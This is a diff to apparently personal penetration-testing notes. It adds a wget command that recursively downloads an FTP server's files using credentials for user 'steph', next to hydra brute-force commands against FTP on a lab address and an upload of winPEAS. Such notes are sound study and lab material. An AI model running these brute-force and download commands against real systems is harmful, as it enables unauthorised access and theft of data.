@@ -46,6 +46,10 @@ ftp> put winPEASx86.exe
 hydra -l steph -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.68 -t 4 ftp
 hydra -l steph -P /usr/share/wordlists/rockyou.txt 10.1.1.68 -t 4 ftp
 ````
+##### Downloading files recursively
+````
+wget -r ftp://steph:billabong@10.1.1.68/
+````
 
 #### SSH port 22
 ##### Emumeration
